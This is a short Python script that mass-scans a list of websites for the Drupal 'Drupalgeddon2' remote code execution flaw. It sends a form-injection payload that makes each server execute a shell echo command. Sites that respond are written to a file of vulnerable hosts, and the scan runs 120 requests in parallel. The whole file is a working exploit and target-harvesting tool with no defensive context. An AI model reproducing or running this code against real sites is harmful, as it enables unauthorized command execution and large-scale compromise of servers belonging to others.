# -*- coding: utf-8 -*-
#!/usr/bin/env python3

import sys
import requests
from multiprocessing.dummy import Pool

requests.urllib3.disable_warnings()

try:
    target = [i.strip() for i in open(sys.argv[1], mode='r').readlines()]
except IndexError:
    exit('noob: pd.py list.txt')

def chips(yeah):
    try:
        url = yeah+'/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax'
        ua = {'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36'}
        kelosex = {"form_id": "user_register_form", "_drupal_ajax": "1", "mail[#post_render][]": "exec", "mail[#type]": "markup", "mail[#markup]": "echo 'omelette'"}
        r = requests.post(url, headers=ua, data=kelosex)
        if 'omelette' in requests.get(url, headers=ua, data=kelosex).text:
            open("lacoste.txt","a").write(yeah+"\n")
            print(yeah, " -> Vuln frr")
        else:
            print(yeah, " -> Nan")    
    except:
        pass

mp = Pool(120)
mp.map(chips, target)
mp.close()
mp.join()
